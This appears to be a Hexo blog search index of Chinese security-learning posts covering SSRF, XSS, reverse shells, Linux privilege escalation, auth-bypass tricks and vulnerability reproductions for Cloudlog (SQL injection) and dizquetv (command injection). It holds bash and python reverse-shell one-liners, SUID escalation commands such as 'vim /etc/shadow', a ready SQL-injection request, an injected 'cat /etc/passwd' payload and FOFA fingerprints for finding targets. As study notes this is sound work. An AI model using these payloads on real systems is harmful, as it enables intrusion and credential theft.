<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ssrf漏洞学习</title>
    <link href="/2024/11/28/ssrf%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/11/28/ssrf%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><img src="/images/ssrfLearn/ssrf1.png"></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>有些web应用可以用url获取其他服务器上的资源，该功能若有安全缺陷，则可以借此web应用作为代理攻击远程和本地服务器。</p><h2 id="黑盒发现"><a href="#黑盒发现" class="headerlink" title="黑盒发现"></a>黑盒发现</h2><h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><ul><li>远程加载图片</li><li>远程加载资源文件，如页面</li></ul><h3 id="一般利用手段"><a href="#一般利用手段" class="headerlink" title="一般利用手段"></a>一般利用手段</h3><ul><li>请求非http服务的端口，如<a href="http://scanme.nmap.org:22/test.txt">http://scanme.nmap.org:22/test.txt</a> 会返回banner信息</li><li>请求关闭的端口，如<a href="http://scanme.nmap.org:25/test.txt">http://scanme.nmap.org:25/test.txt</a> 会报错</li><li>请求本机端口 如<a href="http://127.0.0.1:3306/test.txt%EF%BC%8C%E4%BC%9A%E8%BF%94%E5%9B%9E%E9%9C%80%E8%A6%81%E5%AF%86%E7%A0%81%E7%AD%89%E7%89%B9%E5%BE%81">http://127.0.0.1:3306/test.txt，会返回需要密码等特征</a></li><li>请求内网或者本地应用，<a href="http://127.0.0.1:8987/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">http://127.0.0.1:8987/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</a> AAAAA让他溢出崩溃</li><li>对内网应用识别指纹，比如访问默认文件路径，进行fuzz 如 <a href="http://10.0.0.1/portName.js">http://10.0.0.1/portName.js</a> 可以根据返回结果判断是否是Dlink 路由器</li><li>攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2， sqli等），木马放公网服务器上让目标去取</li></ul><h3 id="导致的风险"><a href="#导致的风险" class="headerlink" title="导致的风险"></a>导致的风险</h3><ul><li>会导致内网信息泄露，如端口、内部IP信息泄露等</li><li>作为跳板，攻击内网</li><li>利用特殊协议如file、golpher等进行高级利用</li></ul><h2 id="白盒检查"><a href="#白盒检查" class="headerlink" title="白盒检查"></a>白盒检查</h2><h3 id="特征-1"><a href="#特征-1" class="headerlink" title="特征"></a>特征</h3><ul><li>寻找以url为参数的的方法<ul><li>常见的如使用Apache的HttpClient组件： 如下代码中使用了httpclient组件，且请求的url来自用户输入，则该处存在SSRF漏洞。<br><img src="/images/ssrfLearn/ssrf2.png"></li><li>使用Java原生的HttpUrlConnection用来发送Http请求，如下图，请求的url来自用 户输入，则该处存在SSRF漏洞<br><img src="/images/ssrfLearn/ssrf3.png"></li></ul></li></ul><h3 id="in-java"><a href="#in-java" class="headerlink" title="in java"></a>in java</h3><p>java中可以发 出网络请求的类如下：</p><ul><li>HttpClient</li><li>Request（该类是对HttpClient的封装）</li><li>HttpURLConnection</li><li>URL</li><li>Okhttp<br>SSRF 在java中的利用相对受限：</li><li>利用file协议读文件</li><li>利用http&#x2F;https协议探测端口，或向内网其他web应用发起攻击</li></ul><h2 id="绕过利用的tips"><a href="#绕过利用的tips" class="headerlink" title="绕过利用的tips"></a>绕过利用的tips</h2><ul><li><a href="http://www.baidu.com@10.10.10.10/">http://www.baidu.com@10.10.10.10</a> 与 <a href="http://10.10.10.10/">http://10.10.10.10</a> 请求是相同的</li><li>绕过正则匹配IP，将ip使用进制编码，8，16 ，10 ，16等</li><li>10.0.0.1这个IP可以写成10.1</li><li>一个可以指向任意ip的域名：xip.io，多用于SSRF。xip.io(<a href="http://xip.io/)%E7%9A%84%E5%8E%9F%E7%90%86%E5%BE%88%E7%AE%80%E5%8D%95%EF%BC%8C">http://xip.io/)的原理很简单，</a> 即dns解析服务，可以利用xip.io进行域名任意绑定。用法如下： 10.0.0.1.xip.io指向的域名：10.0.0.1 <a href="http://www.10.0.0.1.xip.io指向的域名：10.0.0.1">www.10.0.0.1.xip.io指向的域名：10.0.0.1</a> mysite.10.0.0.1.xip.io指向的域名：10.0.0.1 foo.bar.10.0.0.1.xip.io指向的域名：10.0.0.1</li><li>某些 URL 解析器将[]内的任何字符串视为 IPv6 主机，而无需进行其他验证。<ul><li><a href="https://evil.com/[.xxx.com]">https://evil.com\[.xxx.com]</a> –&gt;<a href="https://evil.com/">https://evil.com/</a></li></ul></li><li>申请短域名指向内网地址: <a href="http://192.168.31.1/">http://192.168.31.1</a> -&gt; <a href="http://suo.im/1QLXa2">http://suo.im/1QLXa2</a> 访问 <a href="http://suo.im/1QLXa2">http://suo.im/1QLXa2</a> 实际上就是请求 <a href="http://192.168.31.1/">http://192.168.31.1。</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>安全技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss漏洞学习</title>
    <link href="/2024/11/25/xss%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/11/25/xss%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>获取自前端的参数值，未经过滤和处理，直接反馈给前端页面。</p><p>一般通过XSS全局过滤器进行对request中的所有参数拦截处理，对用户输入的内容进行非法字符的判断。</p><p>如果还有非法字符，例如<code>&#39; ” &lt; &gt;</code>等编码转义处理，使其浏览器不能解析此类字符，在java中一般采用的封装了ESAPI的XSS的Filter处理.</p><p><img src="/images/xssLearn/xssLearn1.png"></p><h4 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h4><p>假如<a href="http://test.com/xss1.php">http://test.com/xss1.php</a>存在XSS反射型跨站漏洞，那么攻击者的步骤可能如下。</p><p>①test1是网站test.com的用户，此时正在登录的状态中。</p><p>②攻击者发现<a href="http://test.com/xss1.php">http://test.com/xss1.php</a>存在XSS反射型跨站漏洞，然后精心构造JavaScript代码，此段代码可以窃取用户的cookie。</p><p>③攻击者将带有反射型XSS漏洞的URL通过站内信息发送给用户test1，使用各种诱导的方式让用户test1去打开链接。</p><p>④如果用户test1打开了带有XSS漏洞的URL，那么就会把自己的cookie发送到攻击者中。</p><p>⑤攻击者接受到用户test1的会话cookie，就可以直接利用cookie以test1的身份登录test.com网站中。</p><p>以上步骤，通过使用反射型XSS漏洞可以以test1的身份登录网站，这就是其危害。</p><h4 id="获取前端参数值的几种方法"><a href="#获取前端参数值的几种方法" class="headerlink" title="获取前端参数值的几种方法"></a>获取前端参数值的几种方法</h4><p>1、直接使用servlet技术，requests.getparameter(“参数值”)</p><p><img src="/images/xssLearn/xssLearn2.png"></p><p>2、请求参数名和Controller方法的参数一致</p><p><img src="/images/xssLearn/xssLearn3.png"></p><p>3、请求参数名和controller方法中的对象的参数一致</p><p><img src="/images/xssLearn/xssLearn4.png"></p><p>4、自定义方法参数名（当请求参数名与方法参数名不一致）</p><p><img src="/images/xssLearn/xssLearn5.png"></p><h4 id="前端输出"><a href="#前端输出" class="headerlink" title="前端输出"></a>前端输出</h4><p>1、使用安全的输出方法</p><ul><li>在将动态数据插入到html、css、Js中时，使用安全的输出方法，对于html内容，使用‘innerText’或者‘textContent’而非‘innerHTML’</li></ul><p>2、转义特殊字符</p><ul><li>在插入动态数据之前，确保对特殊字符进行转义。这包括 &lt; &gt; &amp; ‘ “ 等。在前端可以使用Handlebars、React的JSX、Vue的Mustache 等模板引擎，他们回自动进行字符转义。</li></ul><p><em><strong>Ant Design</strong></em> <em>是一套基于React的企业级UI设计语言和React组件库。</em></p><ul><li>_JSX：_使用花括号 <strong>{}</strong> 包裹的动态内容最终会被正确地渲染为对应的 HTML 元素。这意味着如果动态内容包含 HTML 标签，这些标签会被解释为真正的 HTML 元素。</li></ul><p>在 React 中，如果你尝试渲染包含 <code>&lt;script&gt;</code>标签的内容，React 会默认对其中的内容进行转义，防止直接执行脚本。</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">const scriptContent = &quot;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/xss/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&quot;;</span><br><span class="language-xml">const element = <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><span class="hljs-template-variable">&#123;scriptContent&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>;</span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/xss/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></code></pre></td></tr></table></figure><ul><li>Mustache 模板引擎默认会对变量进行 HTML 转义，以防止 XSS 攻击。这意味着插入到模板中的变量内容会被转义，将特殊字符（如 <strong>&lt;**, **&gt;</strong>, **&amp;**）转换为对应的 HTML 实体。</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">如果 content 包含 <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>，<br>Mustache 会将其转义为:<br></code></pre></td></tr></table></figure><p><code>&amp;lt;script&amp;gt;alert(&#39;XSS&#39;)&amp;lt;/script&amp;gt;</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>安全技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反弹shell</title>
    <link href="/2024/11/21/%E5%8F%8D%E5%BC%B9shell/"/>
    <url>/2024/11/21/%E5%8F%8D%E5%BC%B9shell/</url>
    
    <content type="html"><![CDATA[<h3 id="哑shell变交互shell"><a href="#哑shell变交互shell" class="headerlink" title="哑shell变交互shell"></a>哑shell变交互shell</h3><p>具体如下，第一步，在哑 shell 中执行：<br><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>键入 Ctrl-Z，回到 VPS 的命令行中；第二步，在 VPS 中执行：<br><code>stty raw -echo</code><br><code>fg</code></p><p>回到哑 shell 中；第三步，在哑 shell 中键入 Ctrl-l，执行：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ reset<br>$ <span class="hljs-built_in">export</span> <span class="hljs-attribute">SHELL</span>=bash<br>$ <span class="hljs-built_in">export</span> <span class="hljs-attribute">TERM</span>=xterm-256color<br>$ stty rows 54 columns 104<br></code></pre></td></tr></table></figure><p>这样，可以得到功能齐全的交互式 shell，比如，支持命令补全、语法高亮：</p><p><img src="/images/Reshell/reshell1.png" alt="《linux反弹shell以及哑shell变为交互式shell》"></p><h3 id="NC-接收"><a href="#NC-接收" class="headerlink" title="NC 接收"></a>NC 接收</h3><ul><li>nc -lvp 7777 -e &#x2F;bin&#x2F;bash</li></ul><h3 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h3><ul><li>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</li></ul><h3 id="python反弹"><a href="#python反弹" class="headerlink" title="python反弹"></a>python反弹</h3><p><code>python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;</code></p><p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code><br>这个代码片段用于在非交互式 Shell 中获取一个更完整的交互式环境，通常用于提升命令行体验。</p>]]></content>
    
    
    
    <tags>
      
      <tag>安全技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux提权</title>
    <link href="/2024/11/21/linux%E6%8F%90%E6%9D%83/"/>
    <url>/2024/11/21/linux%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h2 id="1-查看信息"><a href="#1-查看信息" class="headerlink" title="1.查看信息"></a>1.查看信息</h2><h3 id="内核以及操作系统信息"><a href="#内核以及操作系统信息" class="headerlink" title="内核以及操作系统信息"></a>内核以及操作系统信息</h3><p>uname -a                 打印所有可用的系统信息<br>uname -r                  内核版本<br>uname -n                 系统主机名。<br>uname -m                查看系统内核架构（64位&#x2F;32位）<br>hostname                系统主机名<br>cat &#x2F;proc&#x2F;version    内核信息<br>cat &#x2F;etc&#x2F;-release     分发信息<br>cat &#x2F;etc&#x2F;issue          分发信息<br>cat &#x2F;proc&#x2F;cpuinfo    CPU信息</p><h3 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h3><p>cat &#x2F;etc&#x2F;passwd     列出系统上的所有用户<br>cat &#x2F;etc&#x2F;group        列出系统上的所有组<br><code>grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#39;\$3 == 0 &#123; print \$1&#125;&#39;</code>     列出所有的超级用户账户<br>whoami                  查看当前用户<br>w                             谁目前已登录，他们正在做什么<br>last                          最后登录用户的列表<br>lastlog                     所有用户上次登录的信息<br>lastlog –u %username%  有关指定用户上次登录的信息<br>lastlog |grep -v “Never”   以前登录用户的完</p><p>whoami        当前用户名<br>id                  当前用户信息<br>cat &#x2F;etc&#x2F;sudoers  谁被允许以root身份执行<br>sudo -l                  当前用户可以以root身份执行操作</p><h3 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h3><p>env        显示环境变量<br>set         现实环境变量<br>echo %PATH 路径信息<br>history            显示当前用户的历史命令记录<br>pwd                 输出工作目录<br>cat &#x2F;etc&#x2F;profile   显示默认系统变量<br>cat &#x2F;etc&#x2F;shells    显示可用的shell</p><h2 id="2-脏牛漏洞提权"><a href="#2-脏牛漏洞提权" class="headerlink" title="2.脏牛漏洞提权"></a>2.脏牛漏洞提权</h2><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs subunit">漏洞编号：CVE<span class="hljs-string">-2016</span><span class="hljs-string">-5195</span><br><br>漏洞名称：脏牛（Dirty COW）<br><br>漏洞危害：低权限用户利用该漏洞技术可以在全版本上实现本地提权<br><br>影响范围：Linux kernel &gt;=2.6.22  并且Android也受影响<br></code></pre></td></tr></table></figure><h2 id="3-内核漏洞提权"><a href="#3-内核漏洞提权" class="headerlink" title="3.内核漏洞提权"></a>3.内核漏洞提权</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css">Uname -<span class="hljs-selector-tag">a</span><br><br>Searchsplolit linux<br><br>如果linux内核版本小于<span class="hljs-number">2.6</span>.<span class="hljs-number">22</span>或者脏牛无法成功时，我们需要查看其他版本的内核漏洞。这时我们就用到了kali linux，自身所拥有的searchspolit可以帮助我们查看各种linux发行版本的漏洞。而searchs<br><br>polit的使用也很简单，只需要在后面跟上限定条件即可。<br></code></pre></td></tr></table></figure><h2 id="4-suid提权"><a href="#4-suid提权" class="headerlink" title="4.suid提权"></a>4.suid提权</h2><ul><li>在本地查找符合条件的文件: Nmap Vim find Bash More Less Nano cp</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span>  <br><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span>  <br><span class="hljs-built_in">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; \<br></code></pre></td></tr></table></figure><ul><li>在Metasploit中也有一个模块可以通过SUID Nmap进行提权<br><code> exploit/unix/local/setuid_nmap</code></li><li>如果find以SUID权限运行，所有通过find执行的命令都会以root权限运行</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> <span class="hljs-built_in">test</span>  <br>find <span class="hljs-built_in">test</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \<br></code></pre></td></tr></table></figure><ul><li>Vim的主要用途是用作文本编辑器。 但是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件<br><code>vim /etc/shadow</code></li><li>bash 以下命令将以root身份打开一个bash shell</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">bash -p  <br>bash-3.2# id  <br><span class="hljs-attribute">uid</span>=500(cow) <span class="hljs-attribute">gid</span>=500(cow) <span class="hljs-attribute">euid</span>=0(root) <span class="hljs-attribute">groups</span>=500(cow)<br></code></pre></td></tr></table></figure><ul><li>Less 程序less也可以执行提权后的shell</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">less <span class="hljs-regexp">/etc/</span>passwd  <br>!<span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>安全技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cloudlog_sql注入</title>
    <link href="/2024/11/21/Cloudlog-sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/11/21/Cloudlog-sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p><strong>Cloudlog 是一个自托管的 PHP 应用程序，它允许你在任何地方记录你的业余无线电联络。</strong></p><p>fofa：<code>icon\_hash=&quot;-460032467&quot;</code></p><p><a href="https://github.com/magicbug/Cloudlog">https://github.com/magicbug/Cloudlog</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /index.php/oqrs/delete_oqrs_line HTTP/1.1<br>Host: <br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36<br>Content-Type: application/x-www-form-urlencoded<br>Connection: close<br> <br>id=GTID_SUBSET(CONCAT((MID((IFNULL(CAST(VERSION() AS NCHAR),0x20)),1,190))),666)<br></code></pre></td></tr></table></figure><p><strong>根据情报跟踪到传参接口和参数：post index.php&#x2F;oqrs&#x2F;delete_oqrs_line 参数id</strong></p><p><strong>assets&#x2F;js&#x2F;sections&#x2F;oqrs.js</strong></p><p><strong>application&#x2F;controllers&#x2F;Oqrs.php</strong></p><p><img src="/images/Cloudlog_sqli/Cloudlog_sqli1.png"></p><p><strong>在控制器处理完请求参数后，通常会将数据传递给模型（Model）进行进一步的数据处理或数据库交互。模型专注于业务逻辑和数据的操作，如查询、添加、修改或删除数据库记录等。</strong></p><p><strong>可以看到，参数可能经过了xss清理，也可能是后面打的补丁，但是并没有做sql注入方面的防御，直接拼进了sql语句，故而存在sql注入。</strong></p><p><strong>application&#x2F;models&#x2F;Oqrs_model.php</strong></p><p><img src="/images/Cloudlog_sqli/Cloudlog_sqli2.png"></p><p><img src="/images/Cloudlog_sqli/Cloudlog_sqli3.png"></p><p><strong>从application&#x2F;models&#x2F;Oqrs_model.php 中可以看到，除了上述语句，还存在大量的直接拼接情况。</strong></p><p><img src="/images/Cloudlog_sqli/Cloudlog_sqli4.png"></p><p><img src="/images/Cloudlog_sqli/Cloudlog_sqli5.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dizquetv-1.5.3 rce</title>
    <link href="/2024/11/21/dizquetvRCE/"/>
    <url>/2024/11/21/dizquetvRCE/</url>
    
    <content type="html"><![CDATA[<p><strong>fofa: icon_hash&#x3D;”775930718”</strong></p><p><a href="http://127.0.0.1:8000/#!/settings">http://127.0.0.1:8000/#!&#x2F;settings</a></p><p><strong>ffmpeg 子页面将可执行路径改为</strong></p><p><code>&quot;; cat /etc/passwd &amp;&amp; echo &#39;poc&#39;&quot;</code></p><p><strong>点击update</strong></p><p><img src="/images/dizquetv/diz1.png"></p><p><strong>访问version</strong></p><p><img src="/images/dizquetv/diz2.png"></p><p><strong>跟进到代码中</strong></p><p><strong>src&#x2F;ffmpeg-info.js</strong></p><p><strong>exec 方法接收到的参数会被执行，因此必须谨慎处理，以避免执行不受信任的输入造成的安全问题（例如命令注入）。</strong></p><p><img src="/images/dizquetv/diz3.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>鉴权绕过手段</title>
    <link href="/2024/11/21/%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5/"/>
    <url>/2024/11/21/%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5/</url>
    
    <content type="html"><![CDATA[<p>参考链接<br><a href="https://blog.51cto.com/u_15076204/3992137">https://blog.51cto.com/u_15076204&#x2F;3992137</a><br><img src="/images/PassAuth/PassAuth1.png"><br>什么是httpservletrequest请求</p><ul><li>在 Servlet API 中，定义了一个 HttpServletRequest 接口，它继承自 ServletRequest 接口。</li><li>HttpServletRequest 对象专门用于封装 HTTP 请求消息，简称 request 对象。</li></ul><p>作用</p><ul><li>获取请求行</li><li>获取消息头</li><li>获取 form 表单的数据<br><img src="/images/PassAuth/PassAuth2.png"><br>用户请求—》spring处理uri –》LookupPath –》handler</li></ul><h3 id="Springboot特性"><a href="#Springboot特性" class="headerlink" title="Springboot特性:"></a>Springboot特性:</h3><ul><li>将&#x2F;&#x2F;转换为&#x2F;</li><li>将&#x2F;;xxxxx&#x2F;转换为&#x2F;&#x2F;</li><li>通过getServletPath 获取path值</li><li>对请求的URI进行以此URL解码</li><li>在Springboot &gt; 2.3.0.RELEASE后， alwaysUseFullPath 默认为true，不再处理 ..&#x2F; 在Springboot &lt;&#x3D; 2.3.0.RELEASE， alwaysUseFullPath 默认为false，处理 ..&#x2F;</li></ul><h3 id="Tomcat特性"><a href="#Tomcat特性" class="headerlink" title="Tomcat特性"></a>Tomcat特性</h3><p>几种获取URI的方法</p><ul><li>request.getRequestURI()</li><li>request.getRequestURL()</li><li>request.getContextPath()</li><li>request.getServletPath()</li><li>request.getPathInfo()<br><img src="/images/PassAuth/PassAuth3.png"><br>getPathInfo在配置中配置了servlet-path时，才能够获取到相应的值</li></ul><p>在构造 <a href="http://127.0.0.1:9093/icsl/test/v1/;%2faaa/search1">http://127.0.0.1:9093/icsl/test/v1/aaa/../;%2faaa/search1</a> 这样的请求下， Springboot仍然能够正确路由到相应的Mapping中。那么如果在进行认证鉴权时不考虑这些特殊情况的话，会很容易被绕过。<br><img src="/images/PassAuth/PassAuth4.png"></p><h3 id="Tomcat-RequestURI-全匹配uri认证场景"><a href="#Tomcat-RequestURI-全匹配uri认证场景" class="headerlink" title="Tomcat + RequestURI + 全匹配uri认证场景"></a>Tomcat + RequestURI + 全匹配uri认证场景</h3><p>思路:鉴权全匹配认证，而请求字符串不适配 “全匹配” 场景<br>利用springboot的特性还是可以请求到相关接口而由于字符串不匹配认证鉴权，则不必鉴权。<br>多斜杠 url编码 分号绕过<br>&#x2F;mp&#x2F;goods&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;create<br>&#x2F;mp&#x2F;goods&#x2F;%3dreate<br> &#x2F;mp&#x2F;goods&#x2F;;aaa&#x2F;create<br>达到请求&#x2F;mp&#x2F;goods &#x2F;create接口而不需要鉴权的效果</p><h3 id="Tomcat-RequestURI-正则匹配场景"><a href="#Tomcat-RequestURI-正则匹配场景" class="headerlink" title="Tomcat + RequestURI + 正则匹配场景"></a>Tomcat + RequestURI + 正则匹配场景</h3><p>满足正则—》不需要鉴权<br><img src="/images/PassAuth/PassAuth5.png"></p><h3 id="Tomcat-servletpath-全匹配认证场景"><a href="#Tomcat-servletpath-全匹配认证场景" class="headerlink" title="Tomcat + servletpath + 全匹配认证场景"></a>Tomcat + servletpath + 全匹配认证场景</h3><p>ServletPath虽然会对多个情况进行处理，但如果使用全匹配的话也存在被绕过的可能：<br><img src="/images/PassAuth/PassAuth6.png"><br>思路：末尾添加&#x2F;不满足全匹配场景，不必鉴权，又可以正常向该接口</p><ul><li><p>总结思路，利用spring的特性向接口发起请求，绕过鉴权场景</p><ul><li>&#x2F;mp&#x2F;goods&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;create    请求接口中添加多&#x2F;&#x2F;&#x2F;</li><li>&#x2F;mp&#x2F;goods&#x2F;%3dcreate     请求接口中添加&#x2F;%3d</li><li> &#x2F;mp&#x2F;goods&#x2F;;aaa&#x2F;create  请求接口中添加&#x2F;;xxx&#x2F; 绕过鉴权</li><li>..&#x2F;..&#x2F;..&#x2F;        在不需要鉴权的路径后，添加..&#x2F;..&#x2F;</li><li>Aaa&#x2F;bbb&#x2F;ccc&#x2F;     请求接口末尾添加&#x2F;  绕过鉴权</li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>安全技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>威胁情报</title>
    <link href="/2024/11/21/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
    <url>/2024/11/21/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/</url>
    
    <content type="html"><![CDATA[<p>发现一个主域名下是否被植入类似博彩、色情的暗链，可以采取多种方法，包括使用搜索引擎和专门的安全工具。以下是几种有效的方法：</p><h3 id="使用搜索引擎发现暗链"><a href="#使用搜索引擎发现暗链" class="headerlink" title="使用搜索引擎发现暗链"></a>使用搜索引擎发现暗链</h3><ol><li><p><strong>site:查询</strong>：<br>使用 Google 的 <code>site:</code> 操作符进行查询，可以帮助你查找特定网站下的页面。你可以尝试使用关键词组合，查看是否有异常页面出现。例如：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">site:example.com casino<br>site:example.com porn<br></code></pre></td></tr></table></figure></li><li><p><strong>关键词组合搜索</strong>：<br>尝试结合不同关键词进行搜索，看看是否有任何结果显示可疑内容：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">site:example.com gambling<br>site:example.com adult<br></code></pre></td></tr></table></figure></li></ol><h3 id="搜索留痕技术"><a href="#搜索留痕技术" class="headerlink" title="搜索留痕技术"></a>搜索留痕技术</h3><p>不是被挂黑链，也不是网站漏洞;是利用了网站搜索功能,搜索任意内容,即使结果为空,也会把搜素关键字作为返回页面的标题。</p><ul><li>出现该问题原因是因为网站被做黑帽seo 搜索留痕技术</li><li>参考链接：<br><a href="https://zhuanlan.zhihu.com/p/493970212">https://zhuanlan.zhihu.com/p/493970212</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzIxMDkzMzc5MA==&mid=2247484335&idx=1&sn=8167b58db25106be08dd5a20f0bf725d&chksm=975c42dea02bcbc8d70facae9a56f843f48f589ce6597f3c20f726f5e690425e31f3a44572c0&token=593670957&lang=zh_CN&scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzIxMDkzMzc5MA==&amp;mid=2247484335&amp;idx=1&amp;sn=8167b58db25106be08dd5a20f0bf725d&amp;chksm=975c42dea02bcbc8d70facae9a56f843f48f589ce6597f3c20f726f5e690425e31f3a44572c0&amp;token=593670957&amp;lang=zh_CN&amp;scene=21#wechat_redirect</a></li></ul><h3 id="使用安全工具和服务"><a href="#使用安全工具和服务" class="headerlink" title="使用安全工具和服务"></a>使用安全工具和服务</h3><ol><li><p><strong>Google Search Console</strong>：<br>Google Search Console 可以帮助你监控和维护网站的搜索引擎表现。它可以显示谷歌在你网站上发现的安全问题。你可以通过以下步骤检查你的站点：</p><ul><li>登录 Google Search Console。</li><li>添加并验证你的站点。</li><li>在 “安全与手动操作” 